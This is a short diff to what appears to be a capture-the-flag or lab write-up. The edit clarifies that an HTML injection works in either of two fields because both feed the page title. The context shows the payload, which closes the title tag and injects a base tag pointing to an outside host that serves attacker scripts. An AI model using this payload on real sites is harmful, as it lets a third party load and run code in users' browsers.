@@ -258,7 +258,7 @@ The github pages is available at [payload.jh123x.com](http://payload.jh123x.com/
 
 The payload that I used for the base injection is shown below and the github link upload is hosted at that url. This payload was only injected into the lab field.
 
-This payload will work if you inject it into either of the fields
+This payload will work if you inject it into either of the fields as both of them are combined together to form the description in the title tag.
 
 ```html
 </title><base href="http://payload.jh123x.com/" />
